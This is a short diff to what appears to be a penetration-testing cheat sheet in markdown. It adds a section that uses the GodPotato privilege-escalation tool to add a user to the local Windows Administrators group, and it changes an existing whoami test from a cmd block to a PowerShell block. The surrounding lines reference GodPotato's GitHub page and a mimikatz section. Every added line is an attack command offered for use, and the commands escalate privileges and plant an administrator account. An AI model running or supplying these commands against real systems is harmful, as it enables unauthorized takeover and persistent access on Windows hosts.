@@ -6,10 +6,15 @@
 
 ## test 
 https://github.com/BeichenDream/GodPotato
-```cmd
+```powershell
 .\GodPotato.exe -cmd "cmd /c whoami"
 ```
 
+## add administrator 
+https://github.com/BeichenDream/GodPotato
+```powershell
+.\GodPotato.exe -cmd  "net localgroup Administrators <domain_netbios>\<user> /add"
+```
 
 ## mimikatz 
 https://github.com/BeichenDream/GodPotato
